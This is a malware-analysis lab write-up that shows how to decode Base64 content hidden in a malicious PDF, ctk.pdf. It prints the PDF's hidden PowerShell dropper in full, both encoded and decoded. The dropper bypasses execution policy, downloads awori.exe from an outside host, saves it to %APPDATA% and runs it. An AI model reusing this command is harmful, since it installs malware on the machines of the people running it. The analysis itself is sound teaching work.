# Lab 3.5: Examining ctk.pdf with base64 and base64dump.py

- [Lab 3.5: Examining ctk.pdf with base64 and base64dump.py](#lab-35-examining-ctkpdf-with-base64-and-base64dumppy)
  - [Objectives](#objectives)
  - [Steps](#steps)
  - [1 - Examine ctk.pdf using scite](#1---examine-ctkpdf-using-scite)
  - [2 - Use base64 to decode](#2---use-base64-to-decode)
  - [3 - Use base64dump.py to decode](#3---use-base64dumppy-to-decode)

---

## Objectives

- Gain familiarity with the general structure of PDF files.
- Learn how to use `base64` and `base64dump.py` to extract and decode Base64 artifacts.

<br/>

---

## Steps

1. Examine `ctk.pdf` in **SciTE** to review the file's structure and understand the overall nature of its threat.
2. Decode Base64‐encoded contents from ctk.pdf by using `base64`.
3. Decode Base64‐encoded contents from ctk.pdf by using `base64dump.py`.

<br/>

---

## 1 - Examine ctk.pdf using scite

Unzip `ctk.zip` and extract it in `ctk` directory:

```
unzip ctk.zip -d ctk; cd ctk
```

<br/>

Inspect `ctk.pdf` using `scite`:

```
scite ctk.pdf
```

![picture 247](../images/55db5d2ebbfd6f949bad4140437f5950060434c0db0160f7071dad6c85f69e0c.png)  

- A powershell command is embedded

```
powershell.exe -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABiAHkAcABhAHMAcwAgAC0AbgBvAHAAcgBvAGYAaQBsAGUAIAAtAHcAaQBuAGQAbwB3AHMAdAB5AGwAZQAgAGgAaQBkAGQAZQBuACAALQBjAG8AbQBtAGEAbgBkACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBuAGMAZAB1AGcAYQBuAGQAYQAuAG8AcgBnAC8ALgBjAHMAcwAvAGEAdwBvAHIAaQAuAGUAeABlACcALAAdICQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAYQB3AG8AcgBpAC4AZQB4AGUAHSApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACgAHSAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcAGEAdwBvAHIAaQAuAGUAeABlAB0gKQA= -windowstyle hidden
```

<br/>

---

## 2 - Use base64 to decode

To decode using `base64`:

```
echo "UABvAHcAZQByAFMAaABlAGwAbAAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABiAHkAcABhAHMAcwAgAC0AbgBvAHAAcgBvAGYAaQBsAGUAIAAtAHcAaQBuAGQAbwB3AHMAdAB5AGwAZQAgAGgAaQBkAGQAZQBuACAALQBjAG8AbQBtAGEAbgBkACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBuAGMAZAB1AGcAYQBuAGQAYQAuAG8AcgBnAC8ALgBjAHMAcwAvAGEAdwBvAHIAaQAuAGUAeABlACcALAAdICQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAYQB3AG8AcgBpAC4AZQB4AGUAHSApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACgAHSAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcAGEAdwBvAHIAaQAuAGUAeABlAB0gKQA=" | base64 -d
```

![picture 248](../images/3c87482285e64b5c1fbaad00a35aca9368125f66b120eb061d7cc14c50e9b0df.png)  

- It downloads a file from `http://ncduganda.org/.css/awori.exe`
- Then save to `%APPDATA%\awori.exe`

<br/>

---

## 3 - Use base64dump.py to decode

First find potential base64 encoded content in `ctk.pdf` using `base64dump.py`:

```
base64dump.py ctk.pdf
```

![picture 249](../images/3a5ca03e76f2beb73b3cacdab075a8f42d219f277462943050fc6cc9db01fb3f.png)  

- The string ID 2 looks like a base64 encoded object

<br/>

Then extract the content of item 2 and decode it as string:

```
base64dump.py ctk.pdf -s 2 -S
```

![picture 250](../images/31e19c4d473b8bc612921a61381b6337b78e1fa92d1bebd9f6529db0bcd05922.png)  

```
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://ncduganda.org/.css/awori.exe',
$env:APPDATA\awori.exe
);Start-Process (
$env:APPDATA\awori.exe
```

- Also the same result output in #2

<br/>

---